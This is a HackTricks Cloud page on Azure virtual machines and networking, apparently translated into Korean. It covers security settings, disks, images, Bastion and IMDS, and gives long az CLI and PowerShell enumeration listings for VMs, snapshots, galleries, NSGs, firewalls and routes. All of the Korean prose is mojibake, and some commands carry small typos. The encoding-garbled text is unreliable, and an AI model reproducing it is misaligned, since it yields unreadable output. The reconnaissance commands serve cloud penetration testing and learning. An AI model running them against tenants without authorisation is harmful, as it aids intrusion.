# Az - ê°€ìƒ ë¨¸ì‹  ë° ë„¤íŠ¸ì›Œí¬

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## Azure ë„¤íŠ¸ì›Œí‚¹ ê¸°ë³¸ ì •ë³´

Azure ë„¤íŠ¸ì›Œí¬ëŠ” **ë‹¤ì–‘í•œ ì—”í‹°í‹°ì™€ êµ¬ì„± ë°©ë²•ì„ í¬í•¨í•©ë‹ˆë‹¤.** ë‹¤ì–‘í•œ Azure ë„¤íŠ¸ì›Œí¬ ì—”í‹°í‹°ì— ëŒ€í•œ ê°„ëµí•œ **ì„¤ëª…,** **ì˜ˆì œ** ë° **ì—´ê±°** ëª…ë ¹ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## VMs ê¸°ë³¸ ì •ë³´

Azure ê°€ìƒ ë¨¸ì‹ (VMs)ì€ ìœ ì—°í•˜ê³ , í•„ìš”ì— ë”°ë¼ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” **í´ë¼ìš°ë“œ ê¸°ë°˜ ì„œë²„ë¡œ, Windows ë˜ëŠ” Linux ìš´ì˜ ì²´ì œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ì´ë¥¼ í†µí•´ ë¬¼ë¦¬ì  í•˜ë“œì›¨ì–´ë¥¼ ê´€ë¦¬í•˜ì§€ ì•Šê³ ë„ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ì‘ì—… ë¶€í•˜ë¥¼ ë°°í¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Azure VMsëŠ” íŠ¹ì • ìš”êµ¬ ì‚¬í•­ì„ ì¶©ì¡±í•˜ê³  ê°€ìƒ ë„¤íŠ¸ì›Œí¬, ìŠ¤í† ë¦¬ì§€ ë° ë³´ì•ˆ ë„êµ¬ì™€ ê°™ì€ Azure ì„œë¹„ìŠ¤ì™€ í†µí•©í•  ìˆ˜ ìˆë„ë¡ ë‹¤ì–‘í•œ CPU, ë©”ëª¨ë¦¬ ë° ìŠ¤í† ë¦¬ì§€ ì˜µì…˜ìœ¼ë¡œ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë³´ì•ˆ êµ¬ì„±

* **ê°€ìš©ì„± ì˜ì—­**: ê°€ìš©ì„± ì˜ì—­ì€ íŠ¹ì • Azure ì§€ì—­ ë‚´ì—ì„œ ë¬¼ë¦¬ì ìœ¼ë¡œ ë¶„ë¦¬ëœ ë°ì´í„° ì„¼í„°ì˜ ë…ë¦½ì ì¸ ê·¸ë£¹ìœ¼ë¡œ, ì—¬ëŸ¬ ì˜ì—­ì´ ì§€ì—­ ì¤‘ë‹¨ì´ë‚˜ ì¬í•´ì˜ ì˜í–¥ì„ ë°›ì„ ìœ„í—˜ì„ ìµœì†Œí™”í•©ë‹ˆë‹¤.
* **ë³´ì•ˆ ìœ í˜•**:
* **í‘œì¤€ ë³´ì•ˆ**: íŠ¹ì • êµ¬ì„±ì´ í•„ìš”í•˜ì§€ ì•Šì€ ê¸°ë³¸ ë³´ì•ˆ ìœ í˜•ì…ë‹ˆë‹¤.
* **ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì‹œì‘**: ì´ ë³´ì•ˆ ìœ í˜•ì€ ë³´ì•ˆ ë¶€íŒ… ë° ê°€ìƒ ì‹ ë¢° í”Œë«í¼ ëª¨ë“ˆ(vTPM)ì„ ì‚¬ìš©í•˜ì—¬ ë¶€íŠ¸í‚· ë° ì»¤ë„ ìˆ˜ì¤€ì˜ ë§¬ì›¨ì–´ì— ëŒ€í•œ ë³´í˜¸ë¥¼ ê°•í™”í•©ë‹ˆë‹¤.
* **ê¸°ë°€ VMs**: ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì‹œì‘ ìœ„ì— VM, í•˜ì´í¼ë°”ì´ì € ë° í˜¸ìŠ¤íŠ¸ ê´€ë¦¬ ê°„ì˜ í•˜ë“œì›¨ì–´ ê¸°ë°˜ ê²©ë¦¬ë¥¼ ì œê³µí•˜ê³ , ë””ìŠ¤í¬ ì•”í˜¸í™”ë¥¼ ê°œì„ í•˜ë©° [**ìì„¸íˆ ë³´ê¸°**](https://learn.microsoft.com/en-us/azure/confidential-computing/confidential-vm-overview)**.**
* **ì¸ì¦**: ê¸°ë³¸ì ìœ¼ë¡œ ìƒˆë¡œìš´ **SSH í‚¤ê°€ ìƒì„±**ë˜ì§€ë§Œ, ê³µê°œ í‚¤ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ ì´ì „ í‚¤ì™€ ê¸°ë³¸ ì‚¬ìš©ì ì´ë¦„ì¸ **azureuser**ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ë¹„ë°€ë²ˆí˜¸**ë¥¼ ì‚¬ìš©í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
* **VM ë””ìŠ¤í¬ ì•”í˜¸í™”:** ë””ìŠ¤í¬ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í”Œë«í¼ ê´€ë¦¬ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì •ì§€ ìƒíƒœì—ì„œ ì•”í˜¸í™”ë©ë‹ˆë‹¤.
* **í˜¸ìŠ¤íŠ¸ì—ì„œ ì•”í˜¸í™”**ë¥¼ í™œì„±í™”í•  ìˆ˜ë„ ìˆìœ¼ë©°, ì´ ê²½ìš° ë°ì´í„°ëŠ” ìŠ¤í† ë¦¬ì§€ ì„œë¹„ìŠ¤ë¡œ ì „ì†¡ë˜ê¸° ì „ì— í˜¸ìŠ¤íŠ¸ì—ì„œ ì•”í˜¸í™”ë˜ì–´ í˜¸ìŠ¤íŠ¸ì™€ ìŠ¤í† ë¦¬ì§€ ì„œë¹„ìŠ¤ ê°„ì˜ ì¢…ë‹¨ ê°„ ì•”í˜¸í™”ë¥¼ ë³´ì¥í•©ë‹ˆë‹¤ ([**ë¬¸ì„œ**](https://learn.microsoft.com/en-gb/azure/virtual-machines/disk-encryption#encryption-at-host---end-to-end-encryption-for-your-vm-data)).
* **NIC ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ ê·¸ë£¹**:
* **ì—†ìŒ**: ê¸°ë³¸ì ìœ¼ë¡œ ëª¨ë“  í¬íŠ¸ë¥¼ ì—½ë‹ˆë‹¤.
* **ê¸°ë³¸**: HTTP(80), HTTPS(443), SSH(22), RDP(3389)ì™€ ê°™ì€ ìˆ˜ì‹  í¬íŠ¸ë¥¼ ì‰½ê²Œ ì—´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ê³ ê¸‰**: ë³´ì•ˆ ê·¸ë£¹ ì„ íƒ
* **ë°±ì—…**: **í‘œì¤€** ë°±ì—…(í•˜ë£¨ì— í•œ ë²ˆ) ë° **í–¥ìƒëœ**(í•˜ë£¨ì— ì—¬ëŸ¬ ë²ˆ) ë°±ì—…ì„ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **íŒ¨ì¹˜ ì¡°ì • ì˜µì…˜**: ì„ íƒí•œ ì •ì±…ì— ë”°ë¼ VMì— ìë™ìœ¼ë¡œ íŒ¨ì¹˜ë¥¼ ì ìš©í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. [**ë¬¸ì„œ**](https://learn.microsoft.com/en-us/azure/virtual-machines/automatic-vm-guest-patching)ì—ì„œ ì„¤ëª…í•©ë‹ˆë‹¤.
* **ì•Œë¦¼**: VMì—ì„œ ë¬´ì–¸ê°€ ë°œìƒí•  ë•Œ ì´ë©”ì¼ì´ë‚˜ ëª¨ë°”ì¼ ì•±ìœ¼ë¡œ ìë™ ì•Œë¦¼ì„ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ë³¸ ê·œì¹™:
* CPU ì‚¬ìš©ë¥ ì´ 80%ë¥¼ ì´ˆê³¼
* ì‚¬ìš© ê°€ëŠ¥í•œ ë©”ëª¨ë¦¬ ë°”ì´íŠ¸ê°€ 1GB ë¯¸ë§Œ
* ë°ì´í„° ë””ìŠ¤í¬ IOPS ì†Œë¹„ ë¹„ìœ¨ì´ 95%ë¥¼ ì´ˆê³¼
* OS IOPS ì†Œë¹„ ë¹„ìœ¨ì´ 95%ë¥¼ ì´ˆê³¼
* ì´ ë„¤íŠ¸ì›Œí¬ê°€ 500GBë¥¼ ì´ˆê³¼
* ì´ ë„¤íŠ¸ì›Œí¬ ì•„ì›ƒì´ 200GBë¥¼ ì´ˆê³¼
* VmAvailabilityMetricì´ 1 ë¯¸ë§Œ
* **ìƒíƒœ ëª¨ë‹ˆí„°**: ê¸°ë³¸ì ìœ¼ë¡œ í¬íŠ¸ 80ì—ì„œ HTTP í”„ë¡œí† ì½œì„ í™•ì¸í•©ë‹ˆë‹¤.
* **ì ê¸ˆ**: VMì„ ì ê°€ ì½ê¸° ì „ìš©(**ReadOnly** ì ê¸ˆ)ìœ¼ë¡œ ì„¤ì •í•˜ê±°ë‚˜ ì½ê³  ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆì§€ë§Œ ì‚­ì œí•  ìˆ˜ ì—†ëŠ”(**CanNotDelete** ì ê¸ˆ) ìƒíƒœë¡œ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ëŒ€ë¶€ë¶„ì˜ VM ê´€ë ¨ ë¦¬ì†ŒìŠ¤ëŠ” **ë””ìŠ¤í¬, ìŠ¤ëƒ…ìƒ·** ë“±ê³¼ ê°™ì€ ì ê¸ˆì„ **ì§€ì›í•©ë‹ˆë‹¤**.
* ì ê¸ˆì€ **ë¦¬ì†ŒìŠ¤ ê·¸ë£¹ ë° êµ¬ë… ìˆ˜ì¤€**ì—ì„œë„ ì ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë””ìŠ¤í¬ ë° ìŠ¤ëƒ…ìƒ·

* **2ê°œ ì´ìƒì˜ VMì— ë””ìŠ¤í¬ë¥¼ ì—°ê²°í•  ìˆ˜ ìˆë„ë¡ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**
* ê¸°ë³¸ì ìœ¼ë¡œ ëª¨ë“  ë””ìŠ¤í¬ëŠ” **í”Œë«í¼ í‚¤ë¡œ ì•”í˜¸í™”**ë©ë‹ˆë‹¤.
* ìŠ¤ëƒ…ìƒ·ì—ì„œë„ ë™ì¼í•©ë‹ˆë‹¤.
* ê¸°ë³¸ì ìœ¼ë¡œ ëª¨ë“  ë„¤íŠ¸ì›Œí¬ì—ì„œ ë””ìŠ¤í¬ë¥¼ **ê³µìœ í•  ìˆ˜ ìˆì§€ë§Œ**, íŠ¹ì • **ê°œì¸ ì ‘ê·¼**ìœ¼ë¡œ **ì œí•œ**í•˜ê±°ë‚˜ **ê³µê°œ ë° ê°œì¸ ì ‘ê·¼ì„ ì™„ì „íˆ ë¹„í™œì„±í™”**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìŠ¤ëƒ…ìƒ·ì—ì„œë„ ë™ì¼í•©ë‹ˆë‹¤.
* **ë””ìŠ¤í¬ë¥¼ ë‚´ë³´ë‚´ê¸° ìœ„í•´ SAS URI**(ìµœëŒ€ 60ì¼)ë¥¼ **ìƒì„±í•  ìˆ˜ ìˆìœ¼ë©°**, ì¸ì¦ì´ í•„ìš”í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìŠ¤ëƒ…ìƒ·ì—ì„œë„ ë™ì¼í•©ë‹ˆë‹¤.

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# List all disks
az disk list --output table

# Get info about a disk
az disk show --name <disk-name> --resource-group <rsc-group>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# List all disks
Get-AzDisk

# Get info about a disk
Get-AzDisk -Name <DiskName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}


## ì´ë¯¸ì§€, ê°¤ëŸ¬ë¦¬ ì´ë¯¸ì§€ ë° ë³µì› ì§€ì 

**VM ì´ë¯¸ì§€**ëŠ” ìƒˆë¡œìš´ ê°€ìƒ ë¨¸ì‹ (VM)ì„ **ìƒì„±í•˜ëŠ” ë° í•„ìš”í•œ ìš´ì˜ ì²´ì œ, ì• í”Œë¦¬ì¼€ì´ì…˜ ì„¤ì • ë° íŒŒì¼ ì‹œìŠ¤í…œ**ì„ í¬í•¨í•˜ëŠ” í…œí”Œë¦¿ì…ë‹ˆë‹¤. ì´ë¯¸ì§€ì™€ ë””ìŠ¤í¬ ìŠ¤ëƒ…ìƒ·ì˜ ì°¨ì´ì ì€ ë””ìŠ¤í¬ ìŠ¤ëƒ…ìƒ·ì´ ì£¼ë¡œ ë°±ì—… ë˜ëŠ” ë¬¸ì œ í•´ê²°ì„ ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ë‹¨ì¼ ê´€ë¦¬ ë””ìŠ¤í¬ì˜ ì½ê¸° ì „ìš© ì‹œì  ë³µì‚¬ë³¸ì¸ ë°˜ë©´, ì´ë¯¸ì§€ëŠ” **ì—¬ëŸ¬ ë””ìŠ¤í¬ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìœ¼ë©° ìƒˆë¡œìš´ VMì„ ìƒì„±í•˜ê¸° ìœ„í•œ í…œí”Œë¦¿ìœ¼ë¡œ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤**.\
ì´ë¯¸ì§€ëŠ” Azureì˜ **ì´ë¯¸ì§€ ì„¹ì…˜** ë˜ëŠ” **Azure ì»´í“¨íŠ¸ ê°¤ëŸ¬ë¦¬** ë‚´ì—ì„œ ê´€ë¦¬í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ **ë²„ì „**ì„ ìƒì„±í•˜ê³  ì´ë¯¸ì§€ë¥¼ í¬ë¡œìŠ¤ í…Œë„ŒíŠ¸ë¡œ ê³µìœ í•˜ê±°ë‚˜ ê³µê°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ë³µì› ì§€ì **ì€ VM êµ¬ì„±ê³¼ **ì‹œì ** ì• í”Œë¦¬ì¼€ì´ì…˜ ì¼ê´€ì„± **ìŠ¤ëƒ…ìƒ·**ì„ ì €ì¥í•©ë‹ˆë‹¤. ì´ëŠ” VMê³¼ ê´€ë ¨ì´ ìˆìœ¼ë©°, íŠ¹ì • ì‹œì ì—ì„œ VMì„ ë³µì›í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê²ƒì´ ëª©ì ì…ë‹ˆë‹¤.

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shaerd with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
## List all galleries and get info about one
Get-AzGallery
Get-AzGallery -Name <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all image definitions in a gallery and get info about one
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>
Get-AzGalleryImageDefinition -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName> -Name <ImageDefinitionName>

## List all the versions of an image definition in a gallery
Get-AzGalleryImageVersion -GalleryImageDefinitionName <ImageName> -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

## List all VM applications inside a gallery
Get-AzGalleryApplication -GalleryName <GalleryName> -ResourceGroupName <ResourceGroupName>

# Images
# List all managed images in your subscription
Get-AzImage -Name <ResourceName> -ResourceGroupName <ResourceGroupName>

# Restore points
## List all restore points and get info about 1
Get-AzRestorePointCollection -Name <CollectionName> -ResourceGroupName <ResourceGroupName>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Azure Site Recovery

[**ë¬¸ì„œ**](https://learn.microsoft.com/en-us/azure/site-recovery/site-recovery-overview)ì—ì„œ: Site RecoveryëŠ” ì¤‘ë‹¨ ë™ì•ˆ ë¹„ì¦ˆë‹ˆìŠ¤ ì•±ê³¼ ì›Œí¬ë¡œë“œê°€ ê³„ì† ì‹¤í–‰ë˜ë„ë¡ í•˜ì—¬ ë¹„ì¦ˆë‹ˆìŠ¤ ì—°ì†ì„±ì„ ë³´ì¥í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤. Site RecoveryëŠ” **ì›Œí¬ë¡œë“œë¥¼ ë³µì œ**í•˜ì—¬ ê¸°ë³¸ ì‚¬ì´íŠ¸ì—ì„œ ë³´ì¡° ìœ„ì¹˜ë¡œ ë¬¼ë¦¬ì  ë° ê°€ìƒ ë¨¸ì‹ (VM)ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤. ê¸°ë³¸ ì‚¬ì´íŠ¸ì—ì„œ ì¤‘ë‹¨ì´ ë°œìƒí•˜ë©´ ë³´ì¡° ìœ„ì¹˜ë¡œ ì „í™˜í•˜ê³  ê·¸ê³³ì—ì„œ ì•±ì— ì ‘ê·¼í•©ë‹ˆë‹¤. ê¸°ë³¸ ìœ„ì¹˜ê°€ ë‹¤ì‹œ ì‹¤í–‰ë˜ë©´ ë‹¤ì‹œ ì „í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Azure Bastion

Azure Bastionì€ Azure Portal ë˜ëŠ” ì í”„ ë°•ìŠ¤ë¥¼ í†µí•´ ê°€ìƒ ë¨¸ì‹ (VM)ì— ëŒ€í•œ ì•ˆì „í•˜ê³  ì›í™œí•œ **ì›ê²© ë°ìŠ¤í¬í†± í”„ë¡œí† ì½œ(RDP)** ë° **ë³´ì•ˆ ì…¸(SSH)** ì•¡ì„¸ìŠ¤ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. VMì—ì„œ **ê³µìš© IP ì£¼ì†Œì˜ í•„ìš”ì„±ì„ ì œê±°**í•©ë‹ˆë‹¤.&#x20;

Bastionì€ ì‘ë™í•´ì•¼ í•˜ëŠ” VNetì— `/26` ì„œë¸Œë„· ë§ˆìŠ¤í¬ë¥¼ ê°€ì§„ **`AzureBastionSubnet`**ì´ë¼ëŠ” ì„œë¸Œë„·ì„ ë°°í¬í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, **ë¸Œë¼ìš°ì €ë¥¼ í†µí•´ ë‚´ë¶€ VMì— ì—°ê²°**í•  ìˆ˜ ìˆë„ë¡ í•˜ì—¬ VMì˜ í¬íŠ¸ë¥¼ ì¸í„°ë„·ì— ë…¸ì¶œí•˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤. ë˜í•œ **ì í”„ í˜¸ìŠ¤íŠ¸**ë¡œë„ ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

êµ¬ë… ë‚´ ëª¨ë“  Azure Bastion í˜¸ìŠ¤íŠ¸ë¥¼ ë‚˜ì—´í•˜ê³  ì´ë¥¼ í†µí•´ VMì— ì—°ê²°í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% tabs %}
{% tab title="az cli" %}
{% code overflow="wrap" %}
```bash
# List bastions
az network bastion list -o table

# Connect via SSH through bastion
az network bastion ssh \
--name MyBastion \
--resource-group MyResourceGroup \
--target-resource-id /subscriptions/12345678-1234-1234-1234-123456789abc/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/MyVM \
--auth-type ssh-key \
--username azureuser \
--ssh-key ~/.ssh/id_rsa

# Connect via RDP through bastion
az network bastion rdp \
--name <BASTION_NAME> \
--resource-group <RESOURCE_GROUP> \
--target-resource-id /subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP>/providers/Microsoft.Compute/virtualMachines/<VM_NAME> \
--auth-type password \
--username <VM_USERNAME> \
--password <VM_PASSWORD>
```
{% endcode %}
{% endtab %}
{% tab title="PowerShell" %}
{% code overflow="wrap" %}
```powershell
# List bastions
Get-AzBastion
```
{% endcode %}
{% endtab %}
{% endtabs %}

## ë©”íƒ€ë°ì´í„°

Azure ì¸ìŠ¤í„´ìŠ¤ ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤(IMDS)ëŠ” **ì‹¤í–‰ ì¤‘ì¸ ê°€ìƒ ë¨¸ì‹  ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µ**í•˜ì—¬ ê´€ë¦¬ ë° êµ¬ì„±ì— ë„ì›€ì„ ì¤ë‹ˆë‹¤. SKU, ìŠ¤í† ë¦¬ì§€, ë„¤íŠ¸ì›Œí¬ êµ¬ì„± ë° ì˜ˆì •ëœ ìœ ì§€ ê´€ë¦¬ ì´ë²¤íŠ¸ì— ëŒ€í•œ ì •ë³´ì™€ ê°™ì€ ì„¸ë¶€ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. **ë¹„ë¼ìš°í„° IP ì£¼ì†Œ 169.254.169.254ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” REST API**ë¥¼ í†µí•´ ì œê³µë˜ë©°, ì´ëŠ” VM ë‚´ì—ì„œë§Œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. VMê³¼ IMDS ê°„ì˜ í†µì‹ ì€ í˜¸ìŠ¤íŠ¸ ë‚´ì—ì„œ ì´ë£¨ì–´ì ¸ ì•ˆì „í•œ ì ‘ê·¼ì„ ë³´ì¥í•©ë‹ˆë‹¤. IMDSë¥¼ ì¿¼ë¦¬í•  ë•Œ VM ë‚´ì˜ HTTP í´ë¼ì´ì–¸íŠ¸ëŠ” ì ì ˆí•œ í†µì‹ ì„ ë³´ì¥í•˜ê¸° ìœ„í•´ ì›¹ í”„ë¡ì‹œë¥¼ ìš°íšŒí•´ì•¼ í•©ë‹ˆë‹¤.

ë˜í•œ, ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ì—°ë½í•˜ê¸° ìœ„í•´ HTTP ìš”ì²­ì—ëŠ” **`Metadata: true`** í—¤ë”ê°€ ìˆì–´ì•¼ í•˜ë©° **`X-Forwarded-For`** í—¤ë”ëŠ” ì—†ì–´ì•¼ í•©ë‹ˆë‹¤.

ë‹¤ìŒì—ì„œ ì—´ê±°í•˜ëŠ” ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-vm" %}

## VM ì—´ê±°

{% tabs %}
{% tab title="Az Cli" %}
{% code overflow="wrap" %}
```bash
# VMs
## List all VMs and get info about one
az vm list --output table
az vm show --name <came> --resource-group <rsc-group>

## List all available VM images and get info about one
az vm image list --all --output table

# VM Extensions
## List all VM extensions
az vm extension image list --output table

## Get extensions by publisher
az vm extension image list --publisher "Site24x7" --output table

## List extensions in a VM
az vm extension list -g <rsc-group> --vm-name <vm-name>

## List managed identities in a VM
az vm identity show \
--resource-group <rsc-group> \
--name <vm-name>

# Disks
## List all disks and get info about one
az disk list --output table
az disk show --name <disk-name> --resource-group <rsc-group>

# Snapshots
## List all galleries abd get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all snapshots and get info about one
az snapshot list --output table
az snapshot show --name <name> --resource-group <rsc-group>

# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shared with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>

# Bastion
## list all bastions
az network bastion list -o table

# Network
## List VNets
az network vnet list --query "[].{name:name, location:location, addressSpace:addressSpace}"

## List subnets of a VNet
az network vnet subnet list --resource-group <ResourceGroupName> --vnet-name <VNetName> --query "[].{name:name, addressPrefix:addressPrefix}" -o table

## List public IPs
az network public-ip list --output table

## Get NSG rules
az network nsg rule list --nsg-name <NSGName> --resource-group <ResourceGroupName> --query "[].{name:name, priority:priority, direction:direction, access:access, protocol:protocol, sourceAddressPrefix:sourceAddressPrefix, destinationAddressPrefix:destinationAddressPrefix, sourcePortRange:sourcePortRange, destinationPortRange:destinationPortRange}" -o table

## Get NICs and subnets using this NSG
az network nsg show --name MyLowCostVM-nsg --resource-group Resource_Group_1 --query "{subnets: subnets, networkInterfaces: networkInterfaces}"

## List all Nics & get info of a single one
az network nic list --output table
az network nic show --name <name> --resource-group <rsc-group>

## List Azure Firewalls
az network firewall list --query "[].{name:name, location:location, subnet:subnet, publicIp:publicIp}" -o table

## Get network rules of a firewall
az network firewall network-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get application rules of a firewall
az network firewall application-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## Get nat rules of a firewall
az network firewall nat-rule collection list --firewall-name <FirewallName> --resource-group <ResourceGroupName> --query "[].{name:name, rules:rules}" -o table

## List Route Tables
az network route-table list --query "[].{name:name, resourceGroup:resourceGroup, location:location}" -o table

## List routes for a table
az network route-table route list --route-table-name <RouteTableName> --resource-group <ResourceGroupName> --query "[].{name:name, addressPrefix:addressPrefix, nextHopType:nextHopType, nextHopIpAddress:nextHopIpAddress}" -o table

# Misc
## List all virtual machine scale sets
az vmss list --output table

## List all availability sets
az vm availability-set list --output table

## List all load balancers
az network lb list --output table

## List all storage accounts
az storage account list --output table

## List all custom script extensions on a specific VM
az vm extension list --vm-name <vm-name> --resource-group <resource-group>

# Show boot diagnostics settings for a specific VM
az vm boot-diagnostics get-boot-log --name <vm-name> --resource-group <resource-group>

## List all tags on virtual machines
az resource list --resource-type "Microsoft.Compute/virtualMachines" --query "[].{Name:name, Tags:tags}" --output table

# List all available run commands for virtual machines
az vm run-command list --output table
```
{% endcode %}
{% endtab %}
{% tab title="Az PS" %}
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

